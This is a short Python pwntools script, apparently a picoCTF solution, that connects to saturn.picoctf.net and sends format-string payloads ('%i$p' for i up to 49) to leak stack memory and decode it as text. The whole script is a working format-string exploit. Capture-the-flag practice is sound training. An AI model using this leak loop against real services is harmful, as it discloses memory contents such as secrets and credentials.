#!python3
from pwn import *

for i in range(1,50):
    #connect saturn.picoctf.net 57669
    r = remote('saturn.picoctf.net', 65296)
    r.recv()
    r.sendline(b'%'+str(i).encode()+b'$p')
    a = r.recv().decode()[20:]
    try:
        print(bytearray.fromhex(a).decode()[::-1])
    except:
        next

    r.close()
